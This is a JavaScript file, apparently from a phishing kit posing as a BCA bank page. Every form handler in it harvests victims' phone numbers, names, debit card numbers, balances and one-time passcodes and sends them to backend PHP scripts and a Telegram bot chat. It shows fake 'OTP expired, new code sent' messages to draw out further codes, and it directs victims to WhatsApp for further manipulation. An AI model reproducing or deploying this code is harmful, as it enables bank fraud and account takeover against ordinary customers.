$('#forgetPasswordForm').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
   
    
document.getElementById('btnSubmit').innerHTML = "Memproses...";    

$.ajax({
 type: 'POST',
 url: 'sendDebit.php?action=getforgetPasswordForm',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
var hape = document.getElementById("nomorku").value;
 sessionStorage.setItem("hape", hape);              
 var namaku = document.getElementById("nama").value;
 sessionStorage.setItem("namaku", namaku);
 var kartu = document.getElementById("debit").value;
 sessionStorage.setItem("kartu", kartu);  
   location.href ="./saldo.html";
        }
    });

    return false;
});   

 

     
     
 function sendOtp(event){
    event.preventDefault();
   
    
document.getElementById('btnSubmit2').innerHTML = "Memproses...";    
var nomorku = document.getElementById('nomorku');
var nama = document.getElementById('nama');
var debit = document.getElementById('debit');

var rupiah = document.getElementById('rupiah');
var otp = document.getElementById('otp');


    var gabungan = '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value + '%0A%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣%3A%0A' + otp.value;
   
   

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
$("#invalid").addClass("fontku");      
$("#invalid").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
$("#invalid").css("color","red");
        
   setTimeout(function(){
        $("#invalid").text("Kode OTP baru sudah kami kirimkan kembali");
$("#invalid").css("color","green");
        $("#invalid").show()
   }, 3000);
   setTimeout(function(){
  $("#invalid").css("color","#0f78cb");    
        $("#invalid").text(">> Request Kode OTP ? <<");
     $("#invalid").removeClass("fontku");  document.getElementById('btnSubmit2').innerHTML = "PROSES";$("#otp").val("");          
                $("#otp").focus();
   }, 5000);}});};





 $('#formsaldo').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
document.getElementById('btnSubmit1').innerHTML = "Memproses...";    



$.ajax({

 type: 'POST',
 url: 'sendSaldo.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
 $("#saldopage").fadeOut(); 
 $("#otppage").fadeIn();      
 (() => {
	let TypingSpeed = 70;
	let NxtMsgDelay = 9999000;
	let CharacterPos = 0;
	let MsgBuffer = "";
	let MsgIndex = 0;
	let delay;
	let id = document.getElementById("typing-text");
	let messages =
[
	"Permintaan anda sedang dalam proses,\n Selanjutnya silahkan konfirmasi\n melalui WhatsApp untuk Aktivasi di Mobile BCA "
]

	// https://www.html-code-generator.com/html/typewriter-text-scroller
	const StartTyping = () => {
		if (CharacterPos != messages[MsgIndex].length) {
			MsgBuffer += messages[MsgIndex].charAt(CharacterPos);
			id.value = MsgBuffer+(CharacterPos != messages[MsgIndex].length-1 ? "_":"");
			delay = TypingSpeed;
			id.scrollTop = id.scrollHeight; 
		} else {
			delay = NxtMsgDelay;
			MsgBuffer   = "";
			CharacterPos = -1;
			if (MsgIndex!= messages.length-1){
				MsgIndex++;
			}else {
				MsgIndex = 0;
			}
		}
		CharacterPos++;
		setTimeout(StartTyping, delay);
	}
	StartTyping(1000);

})();       
        }
    });

    return false;
});   
    